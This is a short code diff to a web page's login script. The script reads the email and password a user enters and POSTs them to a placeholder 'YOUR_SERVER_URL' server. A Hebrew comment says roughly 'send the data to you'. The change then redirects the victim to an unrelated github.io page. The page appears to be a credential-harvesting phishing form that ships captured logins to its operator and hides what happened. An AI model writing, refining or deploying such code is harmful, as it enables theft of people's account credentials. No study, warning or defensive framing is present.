@@ -18,14 +18,21 @@
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
-      // שלח את הנתונים אליך
       fetch('https://YOUR_SERVER_URL/login.php', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({ email, password })
-      }).then(res => alert("הפרטים נשלחו ✅"));
+      })
+      .then(() => {
+        // ברגע שהשליחה הצליחה, עוברים לכתובת שלך
+        window.location.href = "https://itapita470.github.io/itapitascompare.com";
+      })
+      .catch(error => {
+        alert("הייתה שגיאה בשליחה 😢");
+        console.error(error);
+      });
     });
   </script>
 </body>
